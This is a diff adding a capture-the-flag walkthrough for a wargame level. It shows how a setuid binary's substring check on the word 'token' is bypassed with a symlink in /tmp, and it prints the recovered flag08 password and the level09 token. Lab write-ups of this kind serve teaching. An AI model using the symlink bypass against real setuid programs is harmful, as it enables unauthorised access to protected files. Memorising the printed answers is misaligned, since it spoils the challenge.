@@ -1,0 +1,30 @@
+for this level we have a suid binary own by the user flag08
+and a token file with read permission to the owner
+
+$> ./level08
+./level08 [file to read]
+
+$> ./level08 token
+You may not access 'token'
+
+after disassembling the binary we can see the weak protection here
+	if (strstr(argv[1], "token")) {
+		printf("You may not access '%s'\n", argv[1]);
+		exit(1);
+	}
+
+we can't use token as file to read but we can do a symlink to the token file
+
+$> ln -s ~/token /tmp/lv8
+$> ./level08 /tmp/lv8
+quif5eloekouj29ke0vouxean
+
+it's the flag08's password
+
+$> su flag08
+Password: _
+
+$> getflag
+Check flag.Here is your token : 25749xKZ8L7DkSCwJkT9dyv6f
+
+this token is the level09's password
